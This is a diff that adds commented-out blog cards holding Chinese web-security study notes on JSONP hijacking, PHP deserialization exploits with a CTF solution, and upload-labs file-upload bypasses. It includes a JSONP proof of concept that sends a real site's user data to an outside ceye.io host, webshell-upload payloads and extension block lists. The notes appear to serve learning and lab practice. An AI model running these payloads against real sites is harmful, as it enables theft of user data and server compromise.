@@ -118,6 +118,560 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/" class="title">jsonp劫持</a>
+    <section class="desc">
+  JSONP(JSON with Padding)是JSON的一种“使用模式”，创建JSONP是为了授予对JavaScript的跨域读取访问权限，可用于绕过SOP访问跨域数据。
+[同源策略]SOP（ Same Origin Policy 策略由浏览器实施，以防止一个Web应用程序从其他Web应用程序检索信息
+JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性，
+JSONP(JSON with Padding)是JSON的一种“使用模式”
+jsonp劫持： jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据（引诱用户点击访问链接，获取API返回给用户的信息）
+漏洞源码 
+getUser.php
+&lt;?php
+header(&apos;Content-type: application/json&apos;);
+$jsoncallback = htmlspecialchars($_REQUEST [&apos;jsoncallback&apos;]);//获取回调函数名
+//json数据
+//$json_data = &apos;[&quot;id&quot;,&quot;user&quot;]&apos;;
+$json_data=&apos;({&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Aaron&quot;})&apos;;
+echo $jsoncallback . &quot;(&quot; . $json_data . &quot;)&quot;;//输出jsonp格式的数据
+?&gt;客户端实现 callbackFunction 函数
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;JSONP劫持测试&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function callbackFunction(result)
+    {
+        alert(result.name);
+    }
+&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/getUser.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;jsonp漏洞挖掘：首先把Preserve log选项勾上，防止页面刷新跳转的时候访问记录被重置，也方便进行下一步的筛选。
+
+然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 func、function、call、jsonp、jsonpcallback、callback、cb、json、 email
+一次SRC实战漏洞挖掘（没有敏感信息，这里仅作演示）
+
+callback函数可控，测试跨域劫持。poc：
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;title&gt;JSONP EXP跨域测试&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+function jsonpjack(json){
+new Image().src=&quot;http://xxxx.ceye.io/&quot; + JSON.stringify(json)
+}
+&lt;/script&gt;
+&lt;script src=&quot;https://xxxxxsss.baidu.com/new/ApiHome/OneStop/loginTopicInterface?callback=jsonpjack&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;ceye返回结果：
+
+https://www.freebuf.com/articles/web/126347.html
+https://securitycafe.ro/2017/01/18/practical-jsonp-injection/
+
+
+</section>
+    <p class="sub">May 24, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/05/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="title">PHP反序列化漏洞学习</a>
+    <section class="desc">
+  什么是序列化&amp;反序列化：序列化的目的是为了将一个对象通过可保存的字节方式存储起来，这样就可以将序列化字节存储到数据库或者文本当中，当需要的时候再通过反序列化获取
+所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示
+unserialize()函数能够重新把字符串变回php原来的值
+序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。
+serialize()：
+&lt;?php
+class Tw{
+    public $name = &quot;Twe1ve&quot;;    
+    private $sex = &quot;Male&quot;;
+}
+$Tw_n = new Tw;
+$ser = serialize($Tw_n);
+echo $ser;
+echo &quot;&lt;/br&gt;&quot;;
+echo urlencode($ser);
+?&gt;输出结果如下：
+O:2:&quot;Tw&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;Twe1ve&quot;;s:7:&quot;Twsex&quot;;s:4:&quot;Male&quot;;}
+O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7DO:2:Tw:2:   O代表存储的是对象(object),a的话则代表数组，2指代对象名称有两个字符，Tw则是对象名,2则代表有两个值
+{s:4:”name”;s:6:”Twe1ve”;s:7:”Twsex”;s:4:”Male”;}   {}内为属性字符数：属性值；s表示字符串，由于private属性会在类名两侧加入空字节，所以此处Twsex的名称长度7，实际为%00Tw%00sex
+unserialize(): [存在private属性的类，需要先将原有的序列化值urlencode输出，再进行反序列化]
+&lt;?php
+$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;
+$data = urldecode($str);
+$unser = unserialize($data);
+var_dump($unser);
+?&gt;结果：
+object(__PHP_Incomplete_Class)[1]
+  public &apos;__PHP_Incomplete_Class_Name&apos; =&gt; string &apos;Tw&apos; (length=2)
+  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)
+  private &apos;sex&apos; (Tw) =&gt; string &apos;Male&apos; (length=4)在反序列化对象之后，需要当前作用域中存在该类的定义，否则php无法将类对应到指定类
+可以看到，当定义域中不存在该类时会反序列化出一个__PHP_Incomplete_Class的类，也就是一个不完整的类
+其次，在反序列化的过程中，只保存原有类的变量值，并不会保存其函数，具体的函数功能是根据定义域中定义好的函数功能来执行
+&lt;?php
+class Tw{
+    public $name = &quot;Twe1ve&quot;;    
+    private $sex = &quot;Male&quot;;
+}
+$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;
+$data = urldecode($str);
+$unser = unserialize($data);
+var_dump($unser);
+?&gt;结果：
+object(Tw)[1]
+  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)
+  private &apos;sex&apos; =&gt; string &apos;Male&apos; (length=4)利用构造函数等魔术方法（Magic function）：
+
+__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。
+__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。
+__wakeup()：如前所提，unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。
+__toString():用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。
+__sleep():用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。
+…..
+
+魔术方法执行顺序：__wakeup()&gt; __toString()&gt; __destruct()
+漏洞利用1、直接调用，危险函数直接在类中被调用
+class cls{
+   var $value = &apos;echo 123;&apos;;
+   function action(){
+eval($this-&gt;value);
+}
+}
+$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);
+$a-&gt;action();2、危险函数在魔术方法中
+class cls{
+var $value = &apos;echo 123;&apos;;
+function __wakeup(){
+eval($this-&gt;value);
+}
+}
+$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);3、危险函数在其他类中被调用
+当一个类中的成员变量是另一个类，且调用了另一个类中的危险函数。此时就可以序列化前者类，从而触发触发漏洞
+&lt;?php
+class cls1{
+var $ser;
+function __construct(){
+$ser = new ser2();
+}
+function __wakeup(){
+$this-&gt;ser-&gt;evil();
+}
+}
+class cls2{
+var $value = &quot;echo 123;&quot;;
+function evil(){
+eval($this-&gt;value);
+}
+}
+$cls = $GET[&apos;cls&apos;];
+$instance = unserialize($cls);
+?&gt;exp：
+&lt;?php
+class cls1{
+  var $ser;
+function __construct(){
+   $this-&gt;ser = new cls2();
+   }
+}
+class cls2{
+var $value = &apos;phpinfo();&apos;;
+}
+print_r(serialize(new cls1()))
+
+?&gt;第二届网鼎杯反序列化题目：
+&lt;?php
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+class FileHandler {
+protected $op;
+protected $filename;
+protected $content;
+function __construct() {
+    $op = &quot;1&quot;;
+    $filename = &quot;/tmp/tmpfile&quot;;
+    $content = &quot;Hello World!&quot;;
+    $this-&gt;process();
+}
+public function process() {
+    if($this-&gt;op == &quot;1&quot;) {
+        $this-&gt;write();
+    } else if($this-&gt;op == &quot;2&quot;) {
+        $res = $this-&gt;read();
+        $this-&gt;output($res);
+    } else {
+        $this-&gt;output(&quot;Bad Hacker!&quot;);
+    }
+}
+private function write() {
+    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+        if(strlen((string)$this-&gt;content) &gt; 100) {
+            $this-&gt;output(&quot;Too long!&quot;);
+            die();
+        }
+        $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+        if($res) $this-&gt;output(&quot;Successful!&quot;);
+        else $this-&gt;output(&quot;Failed!&quot;);
+    } else {
+        $this-&gt;output(&quot;Failed!&quot;);
+    }
+}
+private function read() {
+    $res = &quot;&quot;;
+    if(isset($this-&gt;filename)) {
+        $res = file_get_contents($this-&gt;filename);
+    }
+    return $res;
+}
+private function output($s) {
+    echo &quot;[Result]:
+&quot;;
+    echo $s;
+}
+function __destruct() {
+    if($this-&gt;op === &quot;2&quot;)
+        $this-&gt;op = &quot;1&quot;;
+    $this-&gt;content = &quot;&quot;;
+    $this-&gt;process();
+}
+}
+function is_valid($s) {
+for($i = 0; $i &lt; strlen($s); $i++)
+    if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+        return false;
+return true;
+}
+if(isset($_GET{&apos;str&apos;})) {
+$str = (string)$_GET[&apos;str&apos;];
+if(is_valid($str)) {
+    $obj = unserialize($str);
+}
+}is_valid : 判断传入字符是否为可打印字符，由于这里的属性均为protected，会生成 %00，但是由于php7对类的修饰不敏感，直接把属性改为public可绕过
+__destruct中为强类型比较，还会讲$op置1，process读取文件，需要让$op为2，由于process使用==弱类型比较，直接让$op=2绕过
+&lt;?php
+class FileHandler {
+public $op = 2 ;
+public $filename = &quot;flag.php&quot; ;
+}
+$class = new FileHandler();
+$ser = serialize($class);
+echo $ser;
+?&gt;O:11:”FileHandler”:2:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;}
+链接：https://www.kingkk.com/2018/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
+https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
+https://xz.aliyun.com/t/3674
+
+
+</section>
+    <p class="sub">May 24, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="title">文件上传漏洞学习</a>
+    <section class="desc">
+  *上传函数： *
+move_upload_file()关于PHP中$_FILES数组的使用方法: 
+
+$_FILES[‘file’][‘name’] 客户端文件名称
+$_FILES[‘file’][‘type’] 文件的MIME类型
+$_FILES[‘file’][‘size’] 文件大小 单位字节
+$_FILES[‘file’][‘tmp_name’] 文件被上传后再服务器端临时文件名，可以在php.ini中指定
+
+1、未过滤或前端过滤，upload_labs-pass 1
+&lt;script type=&quot;text/javascript&quot;&gt;
+function checkFile() {
+    var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;
+    if (file == null || file == &quot;&quot;) {
+        alert(&quot;请选择要上传的文件!&quot;);
+        return false;
+    }
+    //定义允许上传的文件类型
+    var allow_ext = &quot;.jpg|.png|.gif&quot;;
+    //提取上传文件的类型
+    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
+    //判断上传文件类型是否允许上传
+    if (allow_ext.indexOf(ext_name) == -1) {
+        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+        alert(errMsg);
+        return false;
+    }
+}
+&lt;/script&gt;2、content-type验证绕过pass-2：
+if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;]== &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) {
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];        这里仅仅对content-type进行验证，burpsuit抓包之后修改content-type类型即可绕过
+3、黑名单限制后缀名绕过pass-3
+if (file_exists(UPLOAD_PATH)) {
+    $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;);
+    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &apos;.&apos;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+    $file_ext = trim($file_ext); //收尾去空
+    if(!in_array($file_ext, $deny_ext)) {
+        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;    
+黑名单过滤不全面，php3、php5、phhtml等后缀绕过
+黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则
+
+pass-4   
+$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);
+   $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+   $file_name = deldot($file_name);//删除文件名末尾的点
+   $file_ext = strrchr($file_name, &apos;.&apos;);
+   $file_ext = strtolower($file_ext); //转换为小写
+   $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+   $file_ext = trim($file_ext); //收尾去空
+   if(!in_array($file_ext, $deny_ext)) {
+       $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+       $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;     
+黑名单过滤相对较全，但是没有将后缀进行大小写统一，可通过大小写绕过
+黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则
+
+pass-5：       
+$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+$file_name = deldot($file_name);//删除文件名末尾的点
+$file_ext = strrchr($file_name, &apos;.&apos;);
+$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+$file_ext = trim($file_ext); //首尾去空
+if(!in_array($file_ext, $deny_ext)) {
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;黑名单过滤较全，但是没有将后缀进行大小写统一，可通过大小写绕过
+pass-6：   
+if (file_exists(UPLOAD_PATH)) {
+    $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &apos;.&apos;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+    if(!in_array($file_ext, $deny_ext)) {
+        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单，但是没有对后缀名去空出来，后缀名加空格绕过
+pass-7（系统特性绕过）       
+$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+$file_ext = strrchr($file_name, &apos;.&apos;);
+$file_ext = strtolower($file_ext); //转换为小写
+$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+$file_ext = trim($file_ext); //首尾去空
+if(!in_array($file_ext, $deny_ext)) {
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单，但是没有对后缀名去 . 处理；由于在windows中会自动去掉后缀名中末尾的 .  , 即在后缀名末尾加 . 可绕过
+pass-8:（系统特性绕过）   
+if (file_exists(UPLOAD_PATH)) {
+ $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+ $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+ $file_name = deldot($file_name);//删除文件名末尾的点
+ $file_ext = strrchr($file_name, &apos;.&apos;);
+ $file_ext = strtolower($file_ext); //转换为小写
+ $file_ext = trim($file_ext); //首尾去空
+ if(!in_array($file_ext, $deny_ext)) {
+     $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+     $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单,但是没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过
+pass-9:
+$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &apos;.&apos;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+    $file_ext = trim($file_ext); //首尾去空
+
+    if (!in_array($file_ext, $deny_ext)) {
+        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;黑名单过滤很全面，但是同样利用windows特性，构造paylaod， shell.php. .  
+pass-10:  
+if (file_exists(UPLOAD_PATH)) {
+    $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+    $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;  黑名单过滤，将黑名单后缀替换为空，可双写后缀名绕过
+4、白名单后缀名绕过pass-11：
+$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
+$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);
+if(in_array($file_ext,$ext_arr)){
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;$img_path采用拼接方式，可通过路径名截断绕过，burpsuit抓包，上传shell.png,save_path改成../upload/11.php%00
+
+访问http://127.0.0.1/upload/shell.php
+%00截断利用条件：
+
+需满足 php 版本&lt;5.3.4
+php.ini中的magic_quotes_gpc是off状态的,受限于addslasheshes函数
+
+pass-12:    
+$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
+$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);
+if(in_array($file_ext,$ext_arr)){
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;与pass-11不同的时这里使用POST形式传入save_path,由于POST不能对%00自动解码，需要使用0x00进行绕过
+上传shell.png,save_path改成../upload/11.php+  ; 使用 + 是为了方便定位，一直+ 对应的hex为2b，直接修改2b为00即可
+
+访问 http://127.0.0.1/upload/shell.php
+
+其实两个截断的原理都是0x00是字符串的结束标识符，且需要注意的是0x00截断的使用是在路径上！！！！！
+pass-19也同样使用路径拼接的方式，同理，在save_name使用0x00截断即可绕过白名单但是不采取路径拼接的情况下应该考虑,htaccess解析规则和解析漏洞
+5、文件头检查绕过pass-13：    
+$file = fopen($filename, &quot;rb&quot;);
+$bin = fread($file, 2); //只读2字节
+fclose($file);
+$strInfo = @unpack(&quot;C2chars&quot;, $bin);    
+$typeCode = intval($strInfo[&apos;chars1&apos;].$strInfo[&apos;chars2&apos;]);    
